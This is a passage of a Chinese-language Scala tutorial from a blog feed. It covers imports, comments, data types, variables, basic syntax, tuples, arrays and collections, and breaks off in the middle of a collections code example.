        <content type="html"><![CDATA[<h2 id="0x00-Imports"><a href="#0x00-Imports" class="headerlink" title="0x00 Imports"></a>0x00 Imports</h2><h3 id="1-当从一个包中引入多个时，用花括号"><a href="#1-当从一个包中引入多个时，用花括号" class="headerlink" title="1. 当从一个包中引入多个时，用花括号"></a>1. 当从一个包中引入多个时，<strong>用花括号</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span><span class="token punctuation">{</span>Broker<span class="token punctuation">,</span> Offer<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-当引入超过-6-个时使，用通配符"><a href="#2-当引入超过-6-个时使，用通配符" class="headerlink" title="2. 当引入超过 6 个时使，用通配符"></a><strong>2. 当引入超过 6 个时使，用通配符</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注：不要轻率的使用: 一些包导入了太多的名字</p></blockquote><h3 id="3-避免不清晰的引入"><a href="#3-避免不清晰的引入" class="headerlink" title="3. 避免不清晰的引入"></a>3. 避免不清晰的引入</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 避免</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token keyword">import</span> concurrent<span class="token comment" spellcheck="true">// 而应该使用明确的引入</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>twitter<span class="token punctuation">.</span>concurrent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-注释"><a href="#0x01-注释" class="headerlink" title="0x01 注释"></a>0x01 注释</h2><h3 id="1-单行注释"><a href="#1-单行注释" class="headerlink" title="1. 单行注释"></a>1. 单行注释</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 我是注释内容👨</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-多行注释"><a href="#2-多行注释" class="headerlink" title="2. 多行注释"></a>2. 多行注释</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">/**  * 注释内容😃  * ...  */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-数据类型"><a href="#0x02-数据类型" class="headerlink" title="0x02 数据类型"></a>0x02 数据类型</h2><h3 id="1-基本数据类型"><a href="#1-基本数据类型" class="headerlink" title="1. 基本数据类型"></a>1. 基本数据类型</h3><table><thead><tr><th align="center"><strong>数据类型</strong></th><th align="center"><strong>描述</strong></th></tr></thead><tbody><tr><td align="center">Byte</td><td align="center">8bit（1 字节）有符号数字，范围在-128 到 127</td></tr><tr><td align="center">Short</td><td align="center">16bit（2 字节）有符号数字，范围在-32768 到 32767</td></tr><tr><td align="center">Int</td><td align="center">32bit（4 字节）有符号数字，范围在-2147483648 到 2147483647</td></tr><tr><td align="center">Long</td><td align="center">64bit（8 字节）有符号数字，范围在-9223372036854775808 到 9223372036854775807</td></tr><tr><td align="center">Float</td><td align="center">32bit（4 字节），IEEE 754 标准的单精度浮点数</td></tr><tr><td align="center">Double</td><td align="center">64bit（4 字节），IEEE 754 标准的双精度浮点数</td></tr><tr><td align="center">Char</td><td align="center">16bit Unicode 字符，范围在 U+0000 到 U+FFFF</td></tr><tr><td align="center">String</td><td align="center">字符串</td></tr><tr><td align="center">Boolean</td><td align="center">布尔类型</td></tr><tr><td align="center">Unit</td><td align="center">表示无值，和 Java 中 void 等同。用作不返回任何结果的方法的结果类型。Unit 只有一个实例值，写成()</td></tr><tr><td align="center">Null</td><td align="center">空值或空引用，唯一实例是 null，AnyRef 的子类</td></tr><tr><td align="center">Nothing</td><td align="center">Nothing 类型在 Scala 的类层级的最低端；它是任何其他类型的子类型，表示没有值，没有实例</td></tr><tr><td align="center">Option</td><td align="center">表示可能存在（Some），可能不存在（None）的值</td></tr><tr><td align="center">None</td><td align="center">Option 的两个子类之一，用于安全的函数返回值，比 Null 安全</td></tr><tr><td align="center">Some</td><td align="center">Option 的两个子类之一，表示包装了值</td></tr><tr><td align="center">Any</td><td align="center">所有其他类的超类</td></tr><tr><td align="center">AnyRef</td><td align="center">所有引用类(reference class)的超类</td></tr><tr><td align="center">AnyVal</td><td align="center">所有值类型的超类</td></tr><tr><td align="center">Nil</td><td align="center">长度为 0 的 List</td></tr></tbody></table><h3 id="2-类型层次结构"><a href="#2-类型层次结构" class="headerlink" title="2. 类型层次结构"></a>2. 类型层次结构</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615298394830-cf3d5f77-2284-40a7-9504-59f689346420.png#align=left&amp;display=inline&amp;height=443&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=443&amp;originWidth=1467&amp;size=96691&amp;status=done&amp;style=none&amp;width=1467" alt="image.png"><br>数据类型关系图</p><h3 id="3-类型转换"><a href="#3-类型转换" class="headerlink" title="3. 类型转换"></a>3. 类型转换</h3><p>值类型可以按照下面的方向进行单向转换：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615298494810-8cfd2b75-4040-4485-a015-aa1905ea1336.png#align=left&amp;display=inline&amp;height=155&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=155&amp;originWidth=677&amp;size=16322&amp;status=done&amp;style=none&amp;width=677" alt="image.png"><br>Demo</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> x<span class="token operator">:</span> <span class="token builtin">Long</span> <span class="token operator">=</span> <span class="token number">987654321</span><span class="token keyword">val</span> y<span class="token operator">:</span> <span class="token builtin">Float</span> <span class="token operator">=</span> x  <span class="token comment" spellcheck="true">// 9.8765434E8 (note that some precision is lost in this case)</span><span class="token keyword">val</span> face<span class="token operator">:</span> <span class="token builtin">Char</span> <span class="token operator">=</span> <span class="token string">'☺'</span><span class="token keyword">val</span> number<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> face  <span class="token comment" spellcheck="true">// 9786</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-变量-amp-常量"><a href="#0x03-变量-amp-常量" class="headerlink" title="0x03 变量&amp;常量"></a>0x03 变量&amp;常量</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p><em>声明变量</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myVar <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Foo"</span><span class="token keyword">var</span> myVar <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Too"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>声明常量__（</em>常量的值不可修改，修改常量程序将会在编译时报错<em>）</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> myVal <span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Foo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-类型推断"><a href="#2-类型推断" class="headerlink" title="2. 类型推断"></a>2. 类型推断</h3><p>Scala 编译器通常可以推断出表达式的类型，因此你不必显式地声明它。<br>如果在没有指明数据类型的情况下声明变量或常量必须要给出其初始值，否则将会报错。</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myVar <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">val</span> myVal <span class="token operator">=</span> <span class="token string">"Hello, Scala!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-多个变量声明"><a href="#3-多个变量声明" class="headerlink" title="3. 多个变量声明"></a>3. 多个变量声明</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">100</span>   <span class="token comment" spellcheck="true">// x, y 都声明为100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04-基本语法"><a href="#0x04-基本语法" class="headerlink" title="0x04 基本语法"></a>0x04 基本语法</h2><h3 id="1-图解-Scala-语法"><a href="#1-图解-Scala-语法" class="headerlink" title="1. 图解 Scala 语法"></a>1. 图解 Scala 语法</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> name<span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"Scala"</span>println<span class="token punctuation">(</span>s<span class="token string">"嗨，我是${name}，擅长并发和大数据，以语法简洁而著称。"</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"""我诞生于2001年，读作："skah-lah"。我的发明人是 Martin Odersky，他是瑞士洛桑联邦           理工大学教授，顶级编程语言学家。 他曾参与设计了一个原型系统GJ， 最终演变为 Java           泛型。他还曾受雇于 Sun 公司，编写了 javac 的参考编译器。"""</span><span class="token punctuation">)</span><span class="token keyword">def</span> max<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> y<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> x <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> y <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">10</span> <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> println<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token keyword">val</span> tuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>s<span class="token string">"tuple: ${tuple}, name: ${tuple._1}, age: ${tuple._2}"</span><span class="token punctuation">)</span><span class="token keyword">case</span> <span class="token keyword">class</span> User<span class="token punctuation">(</span>name<span class="token operator">:</span> <span class="token builtin">String</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">val</span> jack <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token keyword">val</span> rose <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">"rose"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>jack<span class="token punctuation">,</span> rose<span class="token punctuation">)</span>println<span class="token punctuation">(</span>jack<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">"jack"</span><span class="token punctuation">,</span> jack <span class="token operator">==</span> User<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> lambda <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> y<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token punctuation">{</span> x <span class="token operator">+</span> y <span class="token punctuation">}</span><span class="token keyword">val</span> strings <span class="token operator">=</span> List<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>strings<span class="token punctuation">.</span>map<span class="token punctuation">(</span>s <span class="token keyword">=></span> s<span class="token punctuation">.</span>toInt<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>i <span class="token keyword">=></span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mkString<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> page <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">val</span> users <span class="token operator">=</span> List<span class="token punctuation">(</span>jack<span class="token punctuation">,</span> rose<span class="token punctuation">)</span>println<span class="token punctuation">(</span>users<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>u <span class="token keyword">=></span> u<span class="token punctuation">.</span>age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sortBy<span class="token punctuation">(</span>u <span class="token keyword">=></span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>slice<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">*</span><span class="token punctuation">(</span>page <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> map <span class="token operator">=</span> Map<span class="token punctuation">(</span><span class="token string">"jack"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"rose"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">18</span><span class="token punctuation">)</span>println<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token string">"jack"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> User<span class="token punctuation">(</span>jackName<span class="token punctuation">,</span> jackAge<span class="token punctuation">)</span> <span class="token operator">=</span> jackprintln<span class="token punctuation">(</span>jackName<span class="token punctuation">,</span> jackAge<span class="token punctuation">)</span>jack <span class="token keyword">match</span> <span class="token punctuation">{</span>  <span class="token keyword">case</span> User<span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"jack"</span> <span class="token keyword">=></span> println<span class="token punctuation">(</span>s<span class="token string">"jack matched."</span><span class="token punctuation">)</span>  <span class="token keyword">case</span> other <span class="token keyword">=></span> println<span class="token punctuation">(</span>s<span class="token string">"Hello, ${other.name}"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615296230827-0bc1a3ac-0ccd-4514-b167-8efafecf028c.png#align=left&amp;display=inline&amp;height=1394&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1394&amp;originWidth=1918&amp;size=561688&amp;status=done&amp;style=none&amp;width=1918" alt="image.png"></p><h2 id="0x05-元组"><a href="#0x05-元组" class="headerlink" title="0x05 元组"></a>0x05 元组</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>在 Scala 中，元组是一个可以容纳不同类型元素的类，元组是不可变的。<br>当我们需要从函数返回多个值时，元组会派上用场。</p><h3 id="2-定义"><a href="#2-定义" class="headerlink" title="2. 定义"></a>2. 定义</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> ingredient <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"Sugar"</span> <span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>Tuple2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-访问元素"><a href="#3-访问元素" class="headerlink" title="3. 访问元素"></a>3. 访问元素</h3><p>使用下划线语法访问元组， tuple._n 取出了第 n 个元素（假设有足够多元素）。</p><pre class="line-numbers language-scala"><code class="language-scala">println<span class="token punctuation">(</span>ingredient<span class="token punctuation">.</span>_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Sugar</span>println<span class="token punctuation">(</span>ingredient<span class="token punctuation">.</span>_2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-解构元组数据"><a href="#4-解构元组数据" class="headerlink" title="4. 解构元组数据"></a>4. 解构元组数据</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> ingredient <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"Sugar"</span> <span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>Tuple2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token keyword">val</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> quantity<span class="token punctuation">)</span> <span class="token operator">=</span> ingredientprintln<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Sugar</span>println<span class="token punctuation">(</span>quantity<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-元组的应用"><a href="#5-元组的应用" class="headerlink" title="5. 元组的应用"></a>5. 元组的应用</h3><p>在 for 表达式中</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> numPairs <span class="token operator">=</span> List<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">&lt;-</span> numPairs<span class="token punctuation">)</span> <span class="token punctuation">{</span>  println<span class="token punctuation">(</span>a <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-数组"><a href="#0x06-数组" class="headerlink" title="0x06 数组"></a>0x06 数组</h2><h3 id="1-声明-1"><a href="#1-声明-1" class="headerlink" title="1. 声明"></a>1. 声明</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> z<span class="token operator">:</span>Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 或</span><span class="token keyword">var</span> z <span class="token operator">=</span> <span class="token keyword">new</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 或</span><span class="token keyword">var</span> z <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Baidu"</span><span class="token punctuation">,</span> <span class="token string">"Google"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-赋值"><a href="#2-赋值" class="headerlink" title="2. 赋值"></a>2. 赋值</h3><pre class="line-numbers language-scala"><code class="language-scala">z<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Runoob"</span><span class="token punctuation">;</span> z<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Baidu"</span><span class="token punctuation">;</span> z<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Google"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-遍历数组"><a href="#3-遍历数组" class="headerlink" title="3. 遍历数组"></a>3. 遍历数组</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myList <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">1.9</span><span class="token punctuation">,</span> <span class="token number">2.9</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 输出所有数组元素</span><span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">&lt;-</span> myList<span class="token punctuation">)</span> <span class="token punctuation">{</span>  println<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-多维数组"><a href="#4-多维数组" class="headerlink" title="4. 多维数组"></a>4. 多维数组</h3><p><em>定义多维数组</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> myMatrix <span class="token operator">=</span> Array<span class="token punctuation">.</span>ofDim<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em>二维数组处理 Demo</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> Array<span class="token punctuation">.</span>_<span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> myMatrix <span class="token operator">=</span> Array<span class="token punctuation">.</span>ofDim<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 创建矩阵</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            myMatrix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 打印二维阵列</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            print<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token operator">+</span> myMatrix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         println<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-合并数组"><a href="#5-合并数组" class="headerlink" title="5. 合并数组"></a>5. 合并数组</h3><p>可以使用 concat() 方法来合并两个数组， concat() 方法中接受多个数组参数：</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> Array<span class="token punctuation">.</span>_<span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> myList1 <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">1.9</span><span class="token punctuation">,</span> <span class="token number">2.9</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> myList2 <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">8.9</span><span class="token punctuation">,</span> <span class="token number">7.9</span><span class="token punctuation">,</span> <span class="token number">0.4</span><span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> myList3 <span class="token operator">=</span>  concat<span class="token punctuation">(</span> myList1<span class="token punctuation">,</span> myList2<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 输出所有数组元素</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> x <span class="token keyword">&lt;-</span> myList3 <span class="token punctuation">)</span> <span class="token punctuation">{</span>         println<span class="token punctuation">(</span> x <span class="token punctuation">)</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-创建区间数组"><a href="#6-创建区间数组" class="headerlink" title="6. 创建区间数组"></a>6. 创建区间数组</h3><p>使用 range() 方法可以生成一个区间范围内的数组， range() 方法最后一个参数为步长，默认为 1：</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 生成10-20，步长为2的数组</span><span class="token keyword">var</span> myList1 <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 10 12 14 16 18</span><span class="token comment" spellcheck="true">// 生成10-20，步长为1的数组</span><span class="token keyword">var</span> myList2 <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 10 11 12 13 14 15 16 17 18 19</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x07-集合"><a href="#0x07-集合" class="headerlink" title="0x07 集合"></a>0x07 集合</h2><h3 id="1-集合的类型"><a href="#1-集合的类型" class="headerlink" title="1. 集合的类型"></a>1. 集合的类型</h3><p>Scala 集合类包括可变的和不可变的集合两大类。可变集合类可以修改，添加，移除一个集合的元素。而不可变集合类永远不会改变。不过，仍然可以模拟添加，移除或更新操作。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615295369841-53581cea-1e83-4642-84e5-40fe8be7a9f9.png#align=left&amp;display=inline&amp;height=443&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=443&amp;originWidth=481&amp;size=26488&amp;status=done&amp;style=none&amp;width=481" alt="image.png"></p><h3 id="2-集合的使用"><a href="#2-集合的使用" class="headerlink" title="2. 集合的使用"></a>2. 集合的使用</h3><p><em>使用可变集合</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> scala<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>mutable<span class="token comment" spellcheck="true">// 定义可变集合</span><span class="token keyword">val</span> set <span class="token operator">=</span> mutable<span class="token punctuation">.</span>Set<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em>使用集合类型缺省的构造函数</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> seq <span class="token operator">=</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token 